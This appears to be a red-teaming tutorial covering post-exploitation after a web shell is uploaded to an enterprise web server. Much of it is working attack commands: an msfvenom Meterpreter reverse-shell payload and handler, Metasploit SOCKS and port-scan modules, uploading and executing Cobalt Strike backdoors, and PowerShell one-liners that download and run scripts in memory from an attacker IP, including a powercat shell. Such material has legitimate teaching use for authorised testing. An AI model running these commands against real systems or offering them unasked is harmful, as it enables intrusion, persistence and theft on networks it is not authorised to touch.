### Penetration Testing and Red Teaming Scenarios

In real-world scenarios, achieving the goals of a penetration test or red teaming project can typically be approached in two ways:

1. Exploiting services
2. Social engineering

### Attack Surface for Enterprise Organizations

Enterprise organizations have numerous services that can serve as attack surfaces. Examples include:

- Web applications / APIs
- Jenkins
- GitLab
- CRM systems
- Microsoft Exchange
- SharePoint
- VPNs
- And more...

### Penetration Testing Approach

A penetration tester typically follows OWASP methodologies when targeting web applications or APIs. For instance, a tester might exploit vulnerabilities in a web application, upload a web shell, and conclude the penetration testing project once the web shell has been successfully uploaded.

**Penetration Test Process (Simplified):**

1. Identify and exploit web application vulnerabilities.
2. Upload a web shell.
3. Validate access and document findings in the final report.

---

### Red Teaming Approach

For red teamers, the work often begins **after** the web shell is uploaded. Unlike penetration testing, red teaming involves simulating a more sophisticated, adversarial attack aimed at achieving deeper access and persistence within the network.

#### Initial Access and Challenges

1. **Workgroup vs Domain:**
    
    - If the target web server is in a workgroup, gaining access to the domain becomes a priority. This may involve finding credentials or pivoting through lateral movement.
    - If the server is already part of a domain, the focus shifts to escalating privileges and moving laterally within the domain.
2. **Privilege Levels:**
    
    - Initial access might be as a low-privileged user, but due to common misconfigurations, elevated privileges such as `SYSTEM` or `root` might be achievable. For example:
        - Uploading a web shell might provide immediate access to the `NT SYSTEM` account.

#### Example Misconfiguration: Database Credentials

Often, sensitive configuration files such as `web.config` in IIS web servers (located in `C:\inetpub\wwwroot\webapplicationpath\`) contain database connection strings. For example:

```
<connectionStrings>
    <add name="DBConnectionString" connectionString="Data Source=SQLSERVER;Initial Catalog=MyDatabase;User ID=sa;Password=password123" />
</connectionStrings>

```

In this case:

- The `sa` user and password could allow direct access to the SQL database.
- If the SQL server runs as `NT SYSTEM`, commands can be executed with elevated privileges using tools like `xp_cmdshell`.

### Assumed Breach Methodology

The **Assumed Breach** methodology is popular for red teaming. This approach skips the reconnaissance, resource development, and initial access tactics from the MITRE ATT&CK framework, assuming instead that the network is already compromised.

#### Example Scenario:

1. After gaining domain admin privileges, you might need to access an internal service such as RDP (port 3389). If the firewall does not allow external access, port forwarding tools such as `tunna` or the Metasploit `portforward` module can help.

#### Using Metasploit for Port Forwarding:

 Create a Meterpreter payload:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.174.147 LPORT=1234 -f aspx -o shell.aspx
```

Start a Metasploit handler:

```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.174.147
set LPORT 1234
run

```

Perform post-exploitation tasks for instances:
Enable SOCKS proxy:

```
run post/multi/manage/socks_proxy
```


Scan for open ports:

```
run post/multi/gather/portscan
```

Upload long-haul backdoors, such as Cobalt Strike payloads:

```
upload <payload_file> C:\temp\payload.exe 
execute -f C:\temp\payload.exe
```


### Post-Exploitation Discovery

Through the web shell, various **PowerShell commands** can be used for information gathering (discovery). Examples include:

#### Gathering Domain Information:

```
$env:USERDNSDOMAIN
(Get-ADDomain).DNSRoot
(Get-WmiObject Win32_ComputerSystem).Domain
Get-ADDomain | select DNSRoot, NetBIOSName, DomainSID
Get-ADForest
nltest /domain_trusts

```

#### Downloading and Running Scripts In-Memory:

PowerShell allows downloading and executing scripts in-memory, which is useful for evasion. Examples include using tools like Nishang and PowerCat:

```
powershell -c iex ((New-Object Net.WebClient).DownloadString('http://192.168.174.147/Get-Information.ps1')); Get-Information

```

```
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://192.168.174.147/powercat.ps1')); powercat -l -p 443 -e cmd

```
